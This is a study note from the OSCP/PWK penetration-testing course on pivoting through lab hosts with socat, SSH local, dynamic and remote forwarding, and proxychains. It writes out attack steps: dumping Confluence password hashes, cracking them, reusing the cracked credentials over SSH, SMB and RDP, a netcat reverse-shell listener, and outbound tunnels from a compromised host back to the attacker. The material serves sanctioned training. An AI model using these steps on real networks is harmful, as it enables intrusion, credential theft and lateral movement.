---
title: "PWK Module 19 - Port Redirection and SSH Tunneling"
created: "2026-04-05"
source: "PEN-200 PWK Course (OffSec 2025)"
type: reference-note
status: active
tags:
  - oscp
  - pivoting
  - tunneling
  - ssh
  - socat
  - proxychains
  - port-forwarding
  - pwk
  - reference
  - module-19
---

# Module 19 — Port Redirection and SSH Tunneling

> **OSCP Exam Relevance:** Pivoting is the bridge between foothold and full network compromise. In every multi-machine OSCP scenario (especially Active Directory sets), you will need to tunnel through a compromised host to reach internal-only services. Master all four SSH forwarding modes. This is where many candidates get stuck — learn the mental model first, then the commands follow naturally.

**Learning Units Covered:**
- 19.1 The Pivoting Mental Model (WAN → DMZ → Internal)
- 19.2 Port Forwarding with Socat
- 19.3 SSH Local Port Forwarding (`-L`)
- 19.4 SSH Dynamic Port Forwarding (`-D`) + Proxychains
- 19.5 SSH Remote Port Forwarding (`-R`) — bypassing firewalls
- 19.6 SSH Remote Dynamic Port Forwarding

---

## 19.1 The Pivoting Mental Model

### Network Architecture Encountered in Labs

```
[Kali - WAN]  ──────  [CONFLUENCE01 - DMZ]  ──────  [PGDATABASE01 - Internal]
192.168.50.x           192.168.50.63 (WAN)            10.4.50.215 (ens192)
                        10.4.50.63   (DMZ)             172.16.50.215 (ens224)
                                                                │
                                                        [HRSHARES - Deep Internal]
                                                         172.16.50.217
```

**The problem:** Kali can reach CONFLUENCE01 (WAN-facing), but cannot directly reach PGDATABASE01 (DMZ-only) or HRSHARES (deep internal). Every technique in this module solves a different version of this problem.

### Key Definitions

| Term | Meaning |
|------|---------|
| **Port Redirection** | Listen on port A, relay all traffic to port B (different host/port) |
| **Tunneling** | Wrap one protocol inside another (e.g., TCP traffic inside SSH) |
| **DMZ** | Demilitarized Zone — semi-trusted network between WAN and internal |
| **Pivot host** | A compromised machine with access to multiple networks |
| **SOCKS proxy** | Generic proxy that handles any TCP traffic (nmap, smbclient, etc.) |

### How to Identify Multi-Homed Hosts (Pivot Candidates)

Whenever you get a shell, immediately run:
```bash
ip addr       # or ipconfig /all on Windows
ip route      # or route print on Windows
```

**What to look for:**
- Multiple network interfaces (ens192, ens224, eth0, eth1)
- Different subnet IPs on each interface
- Routes to subnets you haven't seen before

**CONFLUENCE01 example:**
```
ens192: 192.168.50.63/24  ← WAN (Kali can reach this)
ens224: 10.4.50.63/24     ← DMZ internal (Kali cannot reach this)
```
→ CONFLUENCE01 is the pivot point into the 10.4.50.0/24 network.

**PGDATABASE01 example:**
```
ens192: 10.4.50.215/24    ← DMZ (reachable from CONFLUENCE01)
ens224: 172.16.50.215/24  ← Deep internal (only reachable from PGDATABASE01)
```
→ PGDATABASE01 is the second pivot into the 172.16.50.0/24 network.

### Sweeping for Live Hosts on Internal Networks

Once on a pivot host, scan for other hosts on internal subnets:

```bash
# Bash ping sweep (works without nmap)
for i in $(seq 1 254); do ping -c 1 -W 1 172.16.50.$i > /dev/null && echo "172.16.50.$i is up"; done

# Port sweep — find SMB hosts on new subnet (port 445)
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
# nc output:
# Connection to 172.16.50.217 445 port [tcp/microsoft-ds] succeeded!
```

---

## 19.2 Port Forwarding with Socat

### What Socat Does

**Socat** (Socket CAT) opens two sockets and pipes data between them. It's the simplest way to create a port forward when SSH isn't available or practical.

```
Kali → CONFLUENCE01:2345 → socat → PGDATABASE01:5432
```

### Scenario: Access PostgreSQL Through Confluence

**Problem:** PGDATABASE01 (10.4.50.215:5432) is only reachable from CONFLUENCE01, not from Kali. Kali has `psql` but CONFLUENCE01 does not.

**Solution:** Use Socat on CONFLUENCE01 to forward a WAN port → to PGDATABASE01's PostgreSQL port.

```bash
# On CONFLUENCE01 — open port 2345, forward all traffic to PGDATABASE01:5432
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
# -ddd         = verbose logging (shows connections)
# TCP-LISTEN   = open a TCP listening socket
# :2345        = on port 2345
# fork         = fork a new process for each connection (handles multiple clients)
# TCP:         = connect to a TCP socket
# 10.4.50.215:5432 = PGDATABASE01's PostgreSQL port
```

**Why `fork` matters:** Without `fork`, socat handles one connection then exits. With `fork`, it stays listening and handles each new connection in a child process — essential for long-running forwards.

**On Kali — connect as if talking directly to PGDATABASE01:**
```bash
psql -h 192.168.50.63 -p 2345 -U postgres
# -h 192.168.50.63 = connect to CONFLUENCE01 (not PGDATABASE01 directly)
# -p 2345          = our socat listener port
# Kali → CONFLUENCE01:2345 → socat → PGDATABASE01:5432

# List databases
postgres=# \l

# Connect to confluence DB and dump user credentials
postgres=# \c confluence
confluence=# select user_name, credential from cwd_user;
# Reveals PKCS5S2 hashes for: admin, database_admin, hr_admin, rdp_admin...
```

### Cracking Confluence PBKDF2 Hashes

```bash
# Atlassian uses PKCS5S2 = PBKDF2-HMAC-SHA1 = hashcat mode 12001
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt

# Results:
# rdp_admin  : P@ssw0rd!
# database_admin : sqlpass123
# hr_admin   : Welcome1234
```

### Pivot Socat to SSH — Reach PGDATABASE01 Directly

Kill the PostgreSQL forward, create a new one pointing at SSH (port 22):

```bash
# On CONFLUENCE01
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
# Now CONFLUENCE01:2222 forwards to PGDATABASE01:22 (SSH)
```

```bash
# On Kali — SSH directly into PGDATABASE01 via CONFLUENCE01
ssh database_admin@192.168.50.63 -p 2222
# sqlpass123
# → shell on PGDATABASE01!
```

### Socat Alternatives

| Tool | Use Case |
|------|----------|
| `socat` | Best for quick port forwards; available on most Linux systems |
| `rinetd` | Daemon-mode port forwarding; better for long-term setups |
| `netcat + FIFO` | `mkfifo /tmp/f; nc -l PORT < /tmp/f | nc TARGET PORT > /tmp/f` — works without socat |
| `iptables` | Root required; persistent kernel-level forwarding |

**iptables approach (requires root):**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/conf/all/forwarding

# Forward traffic arriving on port 2345 to PGDATABASE01:5432
iptables -t nat -A PREROUTING -p tcp --dport 2345 -j DNAT --to-destination 10.4.50.215:5432
iptables -t nat -A POSTROUTING -j MASQUERADE
```

---

## 19.3 SSH Local Port Forwarding (-L)

### The Mental Model

**SSH local port forwarding** binds a port on the **SSH client** machine. All traffic to that local port is:
1. Encrypted and sent through the SSH tunnel to the **SSH server**
2. The SSH server then connects to the target host:port and forwards the traffic

```
[SSH client - CONFLUENCE01]               [SSH server - PGDATABASE01]
   port 4455 (listener)  ─────SSH tunnel──→  forwards to 172.16.50.217:445
         ↑
[Kali connects to CONFLUENCE01:4455]
```

**Key insight:** The SSH _server_ (PGDATABASE01) does the final forwarding — not the SSH client. So the target must be reachable from the SSH **server**, not the client.

### Command Syntax

```
ssh -N -L [bind_address:]local_port:target_host:target_port user@ssh_server
```

| Part | Meaning |
|------|---------|
| `-N` | Don't execute a remote command — just set up the tunnel (stays in foreground) |
| `-L` | Local port forward flag |
| `bind_address` | Which interface to listen on; `0.0.0.0` = all interfaces; omit for localhost only |
| `local_port` | Port to open on the SSH client machine |
| `target_host` | Host the SSH server should forward to |
| `target_port` | Port on the target host |
| `user@ssh_server` | SSH credentials for the tunnel |

### Scenario: Access SMB on HRSHARES via SSH Tunnel

**Setup:**
- CONFLUENCE01 has a shell (no socat, no psql needed)
- PGDATABASE01 discovered HRSHARES at 172.16.50.217:445 (SMB)
- Goal: mount/browse that SMB share from Kali

**Step 1: Upgrade shell to PTY for SSH compatibility**
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

**Step 2: Create the local port forward FROM CONFLUENCE01**
```bash
# Run ON CONFLUENCE01 — connects to PGDATABASE01 via SSH
# Binds port 4455 on ALL CONFLUENCE01 interfaces (0.0.0.0)
# Traffic to CONFLUENCE01:4455 → PGDATABASE01 → 172.16.50.217:445
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
# Password: sqlpass123
```

**Why `0.0.0.0`?** Without specifying a bind address, SSH only listens on `127.0.0.1` — only accessible locally on CONFLUENCE01 itself. Using `0.0.0.0` binds on all interfaces including the WAN-facing IP (192.168.50.63), making it reachable from Kali.

**Step 3: Verify the tunnel is established (on CONFLUENCE01)**
```bash
ss -ntplu
# tcp LISTEN 0 128 0.0.0.0:4455 0.0.0.0:* users:(("ssh",pid=59288,fd=4))
# ↑ ssh process is listening on 4455 — tunnel confirmed
```

**Step 4: Use the tunnel from Kali**
```bash
# List SMB shares on HRSHARES through the tunnel
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
# Shares found: scripts, Users, ADMIN$, C$, IPC$

# Connect to the scripts share and download files
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
smb: \> ls
# Provisioning.ps1  README.txt
smb: \> get Provisioning.ps1
```

**Traffic flow:**
```
Kali:any_port → CONFLUENCE01:4455
                     ↓ (SSH encrypted tunnel)
               PGDATABASE01 (SSH server)
                     ↓ (plain TCP)
               HRSHARES:172.16.50.217:445
```

### Limitation of -L

**One forward per SSH connection.** To reach multiple internal hosts/ports, you'd need multiple SSH sessions. This is where dynamic forwarding (-D) is better.

---

## 19.4 SSH Dynamic Port Forwarding (-D) + Proxychains

### The Mental Model

**SSH dynamic port forwarding** creates a **SOCKS proxy** on the SSH client. Instead of forwarding to one specific target, the SOCKS proxy accepts connections and lets the SSH server forward to **any** host:port reachable from the SSH server.

```
[Kali]                          [CONFLUENCE01 - SSH client]    [PGDATABASE01 - SSH server]
proxychains tool ──→ SOCKS:9999 ─────── SSH tunnel ──────────→ forwards to any internal host:port
                                                                 ├── 172.16.50.217:445 (SMB)
                                                                 ├── 172.16.50.217:3389 (RDP)
                                                                 └── 10.4.50.x:any
```

**Key insight:** One SSH connection gives you access to the entire internal network reachable from the SSH server.

### Command Syntax

```
ssh -N -D [bind_address:]socks_port user@ssh_server
```

| Part | Meaning |
|------|---------|
| `-D` | Dynamic port forwarding (SOCKS proxy) |
| `socks_port` | Local port where the SOCKS proxy listens |
| `bind_address` | `0.0.0.0` = listen on all interfaces (so tools on Kali can reach it) |

### Scenario: Enumerate Entire Internal Network

**Step 1: Create dynamic forward from CONFLUENCE01**
```bash
# On CONFLUENCE01
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
# This creates a SOCKS5 proxy on CONFLUENCE01:9999
```

**Step 2: Configure Proxychains on Kali**

Edit `/etc/proxychains4.conf`:
```bash
# Add at the bottom of the [ProxyList] section
socks5 192.168.50.63 9999
# Point proxychains at CONFLUENCE01's SOCKS proxy
```

**Step 3: Use any tool through the proxy**
```bash
# SMB enumeration through the proxy
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
# proxychains intercepts the connection → routes through CONFLUENCE01:9999 SOCKS → PGDATABASE01 → HRSHARES

# Nmap through the proxy (must use -sT = full TCP connect, SOCKS can't do SYN scans)
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217
# Results: 135, 139, 445, 3389 open

# RDP through the proxy
proxychains xfreerdp /v:172.16.50.217 /u:hr_admin /p:Welcome1234
```

**Important Proxychains constraints:**
- Must use **`-sT` (TCP connect scan)** with nmap — SOCKS can't forward raw packets (SYN scan needs root raw sockets)
- Use **`-Pn`** — ICMP ping doesn't work through SOCKS proxies
- Use **`-n`** — DNS resolution may fail through SOCKS

---

## 19.5 SSH Remote Port Forwarding (-R)

### Why This Exists — The Firewall Problem

Local and dynamic forwarding require opening listening ports on the pivot host's **WAN interface**. But what if a **firewall** blocks all inbound connections to the pivot host except the exploited service (e.g., only TCP 8090 for Confluence)?

You can't bind a new port on the WAN interface — the firewall will block Kali from reaching it.

**The solution: flip the direction.** Instead of Kali connecting TO the pivot host, make the pivot host **connect outward to Kali** (outbound connections are rarely firewalled). The listening port is then opened on Kali, not on the pivot host.

### The Mental Model

```
[CONFLUENCE01 - firewall only allows :8090 inbound]
  SSH client connects OUTWARD to Kali
         │
         └──── SSH tunnel (outbound = allowed through firewall)
                    │
              [Kali - SSH server]
               port 2345 bound on Kali's loopback
                    │
              psql connects to localhost:2345
                    │
              Traffic flows back through tunnel
                    │
              CONFLUENCE01 forwards to PGDATABASE01:5432
```

**Key difference from local forwarding:**
- **Local (-L):** Listening port on SSH _client_, forwarded by SSH _server_
- **Remote (-R):** Listening port on SSH _server_ (Kali), forwarded by SSH _client_ (CONFLUENCE01)

Think of it like a **reverse shell but for port forwarding** — the compromised host connects back to you.

### Command Syntax

```
ssh -N -R [bind_address:]remote_port:target_host:target_port user@kali_ip
```

Run this **on the compromised host (CONFLUENCE01)**.

| Part | Meaning |
|------|---------|
| `-R` | Remote port forward |
| `bind_address` | Interface on **Kali** to bind the port (default: `127.0.0.1`) |
| `remote_port` | Port to open on **Kali** |
| `target_host:target_port` | Where traffic is forwarded TO (reachable from CONFLUENCE01) |
| `user@kali_ip` | SSH credentials for YOUR Kali machine |

### Setting Up Kali's SSH Server

```bash
# Start SSH server on Kali
sudo systemctl start ssh

# Verify it's listening
sudo ss -ntplu | grep 22
# tcp LISTEN 0.0.0.0:22  ← good

# Enable password authentication (often disabled by default on Kali)
sudo nano /etc/ssh/sshd_config
# Set: PasswordAuthentication yes

# Restart SSH to apply changes
sudo systemctl restart ssh
```

### Scenario: Access PGDATABASE01 Through Firewalled CONFLUENCE01

**Step 1: Get shell on CONFLUENCE01 (via CVE-2022-26134)**
```bash
# Exploit Confluence RCE
curl http://192.168.50.63:8090/<CVE-2022-26134-payload>/
nc -nvlp 4444    # catch reverse shell
```

**Step 2: Upgrade shell and create remote port forward**
```bash
# On CONFLUENCE01
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Connect back to Kali and bind port 2345 on Kali's loopback
# Traffic to localhost:2345 on Kali → through tunnel → CONFLUENCE01 → PGDATABASE01:5432
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.45.250
# Enter Kali's password when prompted
```

**Why `127.0.0.1` on the remote side?** By default, `-R` only binds on loopback. This means only processes ON Kali can use port 2345. This is intentional — you don't want other machines on the internet connecting to your pivot's forwarded ports.

**Step 3: Verify port 2345 is bound on Kali**
```bash
# On Kali
ss -ntplu
# tcp LISTEN 127.0.0.1:2345  ← bound by sshd, controlled by the tunnel
```

**Step 4: Use the tunnel from Kali as if PGDATABASE01 were local**
```bash
# Kali connects to localhost:2345 → traffic flows to PGDATABASE01:5432
psql -h 127.0.0.1 -p 2345 -U postgres
# Password: D@t4basePassw0rd!

postgres=# \l
postgres=# \c hr_backup
hr_backup=# \dt
hr_backup=# SELECT * FROM payroll;
```

---

## 19.6 SSH Remote Dynamic Port Forwarding

### The Mental Model

Combines remote forwarding (outbound connection from compromised host) with dynamic forwarding (SOCKS proxy for any destination). Creates a SOCKS proxy on **Kali** that routes through the compromised host into the internal network — without needing inbound firewall access.

```
[CONFLUENCE01 - behind firewall]
  ssh -N -R 9998 kali@192.168.118.4
         │ outbound SSH connection
         ▼
[Kali - SSH server]
  SOCKS proxy on 127.0.0.1:9998
  proxychains → any tool → through CONFLUENCE01 → any internal host
```

### Command

```bash
# On CONFLUENCE01 — no target host:port specified (that's what makes it dynamic)
ssh -N -R 9998 kali@192.168.118.4
# -R 9998 with no target = SOCKS proxy on Kali:9998
```

**Verify on Kali:**
```bash
sudo ss -ntplu
# tcp LISTEN 127.0.0.1:9998   ← SOCKS proxy bound by sshd
# tcp LISTEN [::1]:9998        ← IPv6 as well
```

**Configure Proxychains on Kali:**
```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 9998
```

**Use through Proxychains:**
```bash
# Scan internal host through the remote dynamic SOCKS proxy
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
# Results: 135/tcp open (Windows host confirmed)

# Access SMB through proxy
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234

# RDP through proxy
proxychains xfreerdp /v:172.16.50.217 /u:rdp_admin /p:'P@ssw0rd!'
```

---

## All Four Techniques — Side-by-Side Comparison

| Technique | Flag | Port bound on | Forwarded by | Best for |
|-----------|------|--------------|-------------|---------|
| Local Port Forward | `-L` | SSH client | SSH server | Single service, no firewall |
| Dynamic Port Forward | `-D` | SSH client | SSH server | Full network via SOCKS, no firewall |
| Remote Port Forward | `-R` | SSH server (Kali) | SSH client | Single service behind firewall |
| Remote Dynamic | `-R port` (no target) | SSH server (Kali) | SSH client | Full network via SOCKS, behind firewall |

**Simple rule: Is there a firewall blocking inbound to your pivot?**
- **No firewall** → use `-L` (single) or `-D` (SOCKS)
- **Firewall blocking inbound** → use `-R` (single) or remote `-R` (SOCKS)

---

## The Full Pivoting Workflow (Exam Day)

```
1. Get shell on edge host (CONFLUENCE01)
   └── ip addr → find internal interfaces
   └── ip route → find internal subnets

2. Enumerate internal network from pivot host
   └── for i in $(seq 1 254); do nc -zv -w 1 10.4.x.$i PORT; done

3. Choose tunneling technique based on firewall situation:
   ├── No firewall → socat (simple, fast) or ssh -L / -D
   └── Firewall blocking inbound → ssh -R or remote -D

4. Configure Proxychains if using SOCKS (-D or remote -D)
   └── Edit /etc/proxychains4.conf → socks5 HOST PORT

5. Enumerate/exploit internal hosts through the tunnel
   └── proxychains nmap -sT -Pn -n TARGET
   └── proxychains smbclient / xfreerdp / ssh
   └── Direct tool with custom port for -L forwards

6. Move deeper — repeat from step 1 on newly compromised host
   └── PGDATABASE01 has 172.16.x.x → chain another tunnel
```

---

## Quick Reference — All Commands

```bash
# Socat port forward (on pivot host)
socat -ddd TCP-LISTEN:LOCAL_PORT,fork TCP:TARGET_IP:TARGET_PORT

# SSH Local Port Forward (on pivot host, no firewall)
ssh -N -L 0.0.0.0:LOCAL_PORT:TARGET_HOST:TARGET_PORT user@SSH_SERVER

# SSH Dynamic Port Forward / SOCKS proxy (on pivot host, no firewall)
ssh -N -D 0.0.0.0:SOCKS_PORT user@SSH_SERVER

# SSH Remote Port Forward (on pivot host, firewall blocks inbound)
# First: start Kali SSH, enable PasswordAuthentication in sshd_config
sudo systemctl start ssh
ssh -N -R 127.0.0.1:KALI_PORT:TARGET_HOST:TARGET_PORT kali@KALI_IP

# SSH Remote Dynamic Port Forward (on pivot host, firewall + SOCKS)
ssh -N -R SOCKS_PORT kali@KALI_IP

# Proxychains config (/etc/proxychains4.conf)
# socks5 PROXY_HOST PROXY_PORT

# Use tools through Proxychains
proxychains nmap -vvv -sT --top-ports=20 -Pn -n TARGET_IP
proxychains smbclient -L //TARGET_IP/ -U user --password=pass
proxychains xfreerdp /v:TARGET_IP /u:user /p:pass

# Verify ports bound
ss -ntplu

# Find live hosts (bash, no nmap)
for i in $(seq 1 254); do nc -zv -w 1 SUBNET.$i PORT; done

# Crack Atlassian PKCS5S2 hashes (Confluence)
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt

# Upgrade shell for SSH use
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Connections

- [[Pivoting-Mental-Model]] — permanent note on tunneling logic
- [[PWK-Module-17-Windows-PrivEsc]] — once inside internal network, escalate on Windows hosts
- [[PWK-Module-18-Linux-PrivEsc]] — escalate on internal Linux hosts
- [[PWK-Module-16-Password-Attacks]] — crack Confluence PKCS5S2 hashes (mode 12001)
- [[OSCP-Certification-Sprint]] — parent project

## External Resources

- [SSH Manual - Port Forwarding](https://man.openbsd.org/ssh)
- [Proxychains-ng](https://github.com/haad/proxychains)
- [Socat documentation](http://www.dest-unreach.org/socat/doc/socat.html)
- [PayloadsAllTheThings - Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Network%20Pivoting%20Techniques/README.md)
- [HackTricks - Tunneling](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding)
- [IppSec](https://www.youtube.com/@ippsec) — search "pivoting", "tunneling", "proxychains"

---

## Practice Labs

| Room / Machine | Platform | What it practices |
|----------------|----------|-------------------|
| [Wreath](https://tryhackme.com/room/wreath) | TryHackMe | Full multi-hop pivoting course: SSH -L/-R, Socat, Chisel, sshuttle, plink.exe across a 3-machine network |
| [Extending Your Network](https://tryhackme.com/room/extendingyournetwork) | TryHackMe | Port forwarding and firewall fundamentals (conceptual grounding) |
| [Game Zone](https://tryhackme.com/room/gamezone) | TryHackMe | SSH reverse tunnel to expose internal SQLi service to Kali (SSH -R pattern) |
| [Badbyte](https://tryhackme.com/room/badbyte) | TryHackMe | SSH tunneling to reach internal services on a segmented target |
